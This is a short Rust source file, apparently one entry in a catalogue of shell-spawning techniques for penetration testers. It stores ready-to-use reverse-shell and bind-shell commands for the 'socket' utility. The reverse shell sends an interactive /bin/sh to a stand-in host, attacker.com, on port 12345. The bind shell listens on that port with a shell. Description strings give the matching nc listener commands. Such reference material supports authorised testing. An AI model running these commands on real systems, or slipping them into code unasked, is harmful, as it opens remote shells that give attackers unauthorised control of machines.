pub static BIN_NAME: &'static str = "socket";
pub static RS_DESC: &'static str = "Run `nc -l -p 12345` on the attacker box to receive the shell.";
pub static RS_CODE: &'static str = r#"
    
    RHOST=attacker.com
    RPORT=12345
    socket -qvp '/bin/sh -i' $RHOST $RPORT
"#;
pub static BS_DESC: &'static str =
    "Run `nc target.com 12345` on the attacker box to connect to the shell.";
pub static BS_CODE: &'static str = r#"
    
    LPORT=12345
    socket -svp '/bin/sh -i' $LPORT
"#;
use crate::code::{Code, Tag};
pub static RS: Code<'static> = Code { 
	title: "RS_CODE",
	code: RS_CODE,
	tag: Tag::RS,
};
pub static BS: Code<'static> = Code { 
	title: "BS_CODE",
	code: BS_CODE,
	tag: Tag::BS,
};
